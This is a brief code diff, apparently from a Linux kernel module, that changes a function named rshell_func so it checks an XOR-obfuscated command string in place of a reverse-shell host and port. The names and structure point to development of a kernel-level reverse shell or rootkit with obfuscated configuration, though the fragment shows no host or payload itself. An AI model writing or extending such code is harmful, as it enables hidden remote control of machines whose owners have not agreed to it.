@@ -7,7 +7,8 @@ void xor_decrypt(char* s) {
 }
 
 int rshell_func(void* data) {
-    if ((RSHELL_HOST[0] == '\0') || (RSHELL_PORT[0] == '\0') {
+    if (RSHELL_CMD_OBF[0] == '\0') {
+        pr_info("its empty");
         return 0;
     }
     char command[256];
